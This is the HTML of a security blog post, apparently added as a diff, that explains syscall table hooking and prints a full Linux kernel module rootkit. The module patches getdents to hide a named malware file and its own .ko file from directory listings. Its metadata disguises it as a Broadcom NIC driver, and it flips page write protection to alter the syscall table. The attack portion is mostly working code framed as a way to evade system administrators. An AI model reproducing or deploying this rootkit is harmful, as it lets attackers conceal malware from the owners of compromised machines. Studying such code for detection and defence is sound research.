@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="How can we have our rootkit avoid detection from prying eyes? What kinds of things do we want to hide from?
+This time we get into the meat and bones of our rootkit and look at hooking system calls (sys calls) to help us remain hidden from the wandering eyes of system administrators.
+Syscall Hooking Note there are other types of hooking, I.E inline hooking (most windows rootkits)
+Hooking is not a new concept and forms a part of normal operation in the Linux kernel." />
+<meta name="keywords" content=", Exploit Development, hacking, redteaming, rootkits, security research" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://cybernetic.coffee/blog/the-art-of-hooking/" />
+
+
+    <title>
+        
+            The Art of Syscall Hooking :: Cybernetic Coffee 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.64cc374c419669695f00d5c55727fea41e0fdc86b9beb1b4d1d1bcf24284f422.css">
+
+
+
+
+<link rel="shortcut icon" href="https://cybernetic.coffee/images/favicon.ico" />
+
+
+<meta itemprop="name" content="The Art of Syscall Hooking">
+<meta itemprop="description" content="How can we have our rootkit avoid detection from prying eyes? What kinds of things do we want to hide from?
+This time we get into the meat and bones of our rootkit and look at hooking system calls (sys calls) to help us remain hidden from the wandering eyes of system administrators.
+Syscall Hooking Note there are other types of hooking, I.E inline hooking (most windows rootkits)
+Hooking is not a new concept and forms a part of normal operation in the Linux kernel."><meta itemprop="datePublished" content="2020-03-28T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2020-03-28T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1025">
+<meta itemprop="keywords" content="Exploit Development,hacking,redteaming,rootkits,security research," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="The Art of Syscall Hooking"/>
+<meta name="twitter:description" content="How can we have our rootkit avoid detection from prying eyes? What kinds of things do we want to hide from?
+This time we get into the meat and bones of our rootkit and look at hooking system calls (sys calls) to help us remain hidden from the wandering eyes of system administrators.
+Syscall Hooking Note there are other types of hooking, I.E inline hooking (most windows rootkits)
+Hooking is not a new concept and forms a part of normal operation in the Linux kernel."/>
+
+
+
+
+
+    <meta property="article:section" content="Hacking" />
+
+    <meta property="article:section" content="Rootkits" />
+
+    <meta property="article:section" content="Post Exploitation" />
+
+    <meta property="article:section" content="security research" />
+
+
+
+    <meta property="article:published_time" content="2020-03-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <script src="https://kit.fontawesome.com/5eb4842dc5.js" crossorigin="anonymous"></script>
+
+<a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__text">Cybernetic <i class="fas fa-mug-hot"> </i> </span>
+            <span class="logo__mark"><i class="fas fa-terminal"></i></span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#00ba68;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://cybernetic.coffee/feed/">Activity Feed</a></li><li><a href="https://cybernetic.coffee/projects/">Projects</a></li><li><a href="https://cybernetic.coffee/blog">Blog</a></li><li><a href="https://cybernetic.coffee/ctf">CTF</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+        
+        <div class="post-info">
+            <p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                    <line x1="16" y1="2" x2="16" y2="6"></line>
+                    <line x1="8" y1="2" x2="8" y2="6"></line>
+                    <line x1="3" y1="10" x2="21" y2="10"></line>
+                </svg>
+                
+                    2020-03-28 11:00
+                
+
+                
+            </p>
+        </div>
+        
+
+        <article>
+            <h2 class="post-title"><a href="https://cybernetic.coffee/blog/the-art-of-hooking/">The Art of Syscall Hooking</a></h2>
+
+            
+
+            
+            <div class="post-info">
+
+                <div class="sharing-buttons">
+                    
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2fthe-art-of-hooking%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2fthe-art-of-hooking%2f&amp;resubmit=true&amp;title=The%20Art%20of%20Syscall%20Hooking" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fcybernetic.coffee%2fblog%2fthe-art-of-hooking%2f&amp;t=The%20Art%20of%20Syscall%20Hooking" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+
+
+
+
+
+
+
+                </div>
+            </div>
+            
+
+            <hr />
+
+            
+
+            
+
+            <div class="post-content">
+                <p>How can we have our rootkit avoid detection from prying eyes? What kinds of things do we want to hide from?</p>
+<p>This time we get into the meat and bones of our rootkit and look at hooking system calls (sys calls) to help us remain hidden from the wandering eyes of system administrators.</p>
+<h2 id="syscall-hooking">Syscall Hooking</h2>
+<blockquote>
+<p>Note there are other types of hooking, I.E inline hooking (most windows rootkits)</p>
+</blockquote>
+<p>Hooking is not a new concept and forms a part of normal operation in the Linux kernel. The kind of hooking we will use involves two key concepts at its most basic level; pointers and the system call table.</p>
+<p>In order to make useful changes that help us with our objective, for example remaining cloaked from system programs (and those who execute them) we will need to alter these functions. One way we can do this is by hooking the system call table.</p>
+<p>The system call table from an abstracted view is a big list which acts as a directory to kernel functions/methods, for example reading data <code>sys_read</code>, we can think of it metaphorically, and archaically, as an address book. Under each ‘entry’ in the table we can find the address, in this case that address is a pointer to the location of a function in memory. If we ‘go’ to that address under the listing we will ‘execute’ the code that is stored there. The concept of hooking therefore is that instead of a program&rsquo;s read call going to the system call table and ‘looking up’ the location of the read function in memory and then executing it, it instead points to our modified function in memory and executes that instead. From here we can perform near arbitrary changes to the operation of that program and return our changes to the userland program that originally triggered the call.</p>
+<p>As a side note the userland program does not directly go to the system call table to execute these functions, it instead has the kernel perform these calls on its behalf. Therefore our rootkit must operate as part of the kernel to see these system calls and intercept them (hooking). The following diagram illustrates the concept.</p>
+<p><img src="https://i.imgur.com/OhmoJim.png" alt="hooking diagrammatically"></p>
+<h2 id="modified-insert-syscall">Modified <code>insert</code> syscall</h2>
+<p>What do our modified calls actually do? The answer to that really depends on the objective of the kit, but since we are developing one to cloak our malware and itself we will focus on that notion (which should be pretty common among the vast majority of rootkits). With this in mind we want our modified calls to essentially &lsquo;dis-include&rsquo; our rootkit files and our malware files (since everything is a file in Linux this includes the module file etc) and then return to the normal function as if nothing has changed &hellip;</p>
+<p>Here is a small fragment that will hide a “named” kernel object file (our rootkit) and other named files of our choosing from the ls command and its variants:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">//Neccessary header files
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt; //macros</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/syscalls.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kallsyms.h&gt; //Call system</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/slab.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kern_levels.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/gfp.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;asm/unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;asm/paravirt.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt; //Kernel</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Assists with kernel taint warnings etc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">MODULE_LICENSE</span>(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_AUTHOR</span>(<span style="color:#e6db74">&#34;Broadcom&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_DESCRIPTION</span>(<span style="color:#e6db74">&#34;NIC Device Driver&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_VERSION</span>(<span style="color:#e6db74">&#34;1.0&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">**</span>SYS_CALL_TABLE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Adaptation for 5.0.3.42 and lower (CR4 pinning and CR0 bypass)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">EnablePageWriting</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> address){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> level;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pte_t</span> <span style="color:#f92672">*</span>pte <span style="color:#f92672">=</span> <span style="color:#a6e22e">lookup_address</span>(address, <span style="color:#f92672">&amp;</span>level);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(pte<span style="color:#f92672">-&gt;</span>pte <span style="color:#f92672">&amp;~</span> _PAGE_RW){
+</span></span><span style="display:flex;"><span>		pte<span style="color:#f92672">-&gt;</span>pte <span style="color:#f92672">|=</span> _PAGE_RW;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">DisablePageWriting</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> address){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> level;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pte_t</span> <span style="color:#f92672">*</span>pte <span style="color:#f92672">=</span> <span style="color:#a6e22e">lookup_address</span>(address, <span style="color:#f92672">&amp;</span>level);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pte<span style="color:#f92672">-&gt;</span>pte <span style="color:#f92672">=</span> pte<span style="color:#f92672">-&gt;</span>pte <span style="color:#f92672">&amp;~</span> _PAGE_RW;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> linux_dirent {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>	  d_ino;    <span style="color:#75715e">/* Inode number */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>	  d_off;	  <span style="color:#75715e">/* Offset to next linux_dirent */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>	d_reclen; <span style="color:#75715e">// d_reclen is the way to tell the length of this entry
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">char</span>		      d_name[];   <span style="color:#75715e">// the struct value is actually longer than this, and d_name is variable width.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}<span style="color:#f92672">*</span>dirp2 , <span style="color:#f92672">*</span>dirp3 , <span style="color:#f92672">*</span>retn;   <span style="color:#75715e">// // dirp = directory pointer -&gt; Utility pointers
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------ MALWARE DROP &amp; Verto file hides ------ //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Hardcoded malware package - Rename to something
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&#39;common&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> payload[]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;malware_demo_file.py&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ------- HIDE ROOTKIT DRIVER FILE -------- //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> ko_fl[]  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;verto.ko&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//Original getdents syscall from kernel files (aka kallsym {&#39;call system&#39;})
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>asmlinkage <span style="color:#a6e22e">int</span> ( <span style="color:#f92672">*</span>original_getdents ) (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> linux_dirent <span style="color:#f92672">*</span>dirp, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    -- HOW THIS HIDE FUNCTION WORKS --
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">~&gt; Hook the call for the read/open command
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">~&gt; Point it to directory traversal code
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ~&gt; Uses byte calculations to determine how many resources (represented by structures ) are in dir
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">~&gt; Once it reaches the file to be hidden
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ~&gt; it &#39;skips&#39; it and performs the byte arithmetic to continue normally
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ~&gt; displaying everything else in the
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>asmlinkage <span style="color:#66d9ef">int</span>	<span style="color:#a6e22e">HookGetDents</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> linux_dirent <span style="color:#f92672">*</span>dirp, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> linux_dirent <span style="color:#f92672">*</span>retn, <span style="color:#f92672">*</span>dirp3;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> Records, RemainingBytes, length;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Records <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>original_getdents) (fd, dirp, count);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (Records <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> Records;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  retn <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent <span style="color:#f92672">*</span>) <span style="color:#a6e22e">kmalloc</span>(Records, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//Copy struct from userspace to our memspace in kernel space
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">copy_from_user</span>(retn, dirp, Records);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  dirp3 <span style="color:#f92672">=</span> retn; <span style="color:#75715e">//Holds directory pointer for current dir, used to iterate over
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  RemainingBytes <span style="color:#f92672">=</span> Records;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//While still stuff in the dir
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">while</span>(RemainingBytes <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>    length <span style="color:#f92672">=</span> dirp3<span style="color:#f92672">-&gt;</span>d_reclen; <span style="color:#75715e">//len of record
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RemainingBytes <span style="color:#f92672">-=</span> dirp3<span style="color:#f92672">-&gt;</span>d_reclen; <span style="color:#75715e">//Gives numerical representation of next struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Debugging
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;RemainingBytes %d   </span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> File: %s &#34;</span> ,  RemainingBytes , dirp3<span style="color:#f92672">-&gt;</span>d_name );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>((<span style="color:#a6e22e">strcmp</span>( (dirp3<span style="color:#f92672">-&gt;</span>d_name) , payload) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (<span style="color:#a6e22e">strcmp</span>( (dirp3<span style="color:#f92672">-&gt;</span>d_name) , ko_fl) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(dirp3, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)dirp3<span style="color:#f92672">+</span>dirp3<span style="color:#f92672">-&gt;</span>d_reclen, RemainingBytes);
+</span></span><span style="display:flex;"><span>        Records <span style="color:#f92672">-=</span> length; <span style="color:#75715e">//  replaces dirp3-&gt;d_reclen;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Shift pointer to next structure (file)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    dirp3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent <span style="color:#f92672">*</span>) ((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)dirp3 <span style="color:#f92672">+</span> dirp3<span style="color:#f92672">-&gt;</span>d_reclen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Copy the record back to the origional struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">copy_to_user</span>(dirp, retn, Records); <span style="color:#75715e">//Return to user space (using copy_to_user macro)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">kfree</span>(retn); <span style="color:#75715e">//Free memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> Records;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Set up hooks.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">SetHooks</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Gets Syscall Table **
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 	SYS_CALL_TABLE <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">**</span>)<span style="color:#a6e22e">kallsyms_lookup_name</span>(<span style="color:#e6db74">&#34;sys_call_table&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Hooks Will Be Set.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;System call table at %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, SYS_CALL_TABLE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Opens the memory pages to be written
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">EnablePageWriting</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> )SYS_CALL_TABLE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Replaces Pointer Of Syscall_open on our syscall.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	original_getdents <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)SYS_CALL_TABLE[__NR_getdents];
+</span></span><span style="display:flex;"><span>	SYS_CALL_TABLE[__NR_getdents] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)HookGetDents;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DisablePageWriting</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> )SYS_CALL_TABLE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">HookCleanUp</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Clean up our Hooks
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">EnablePageWriting</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> )SYS_CALL_TABLE);
+</span></span><span style="display:flex;"><span>	SYS_CALL_TABLE[__NR_getdents] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span><span style="color:#f92672">*</span>)original_getdents;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DisablePageWriting</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> )SYS_CALL_TABLE);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Hooks cleaned up&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_init</span>(SetHooks);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_exit</span>(HookCleanUp);
+</span></span></code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        
+        <div class="post-info">
+            
+    <p>
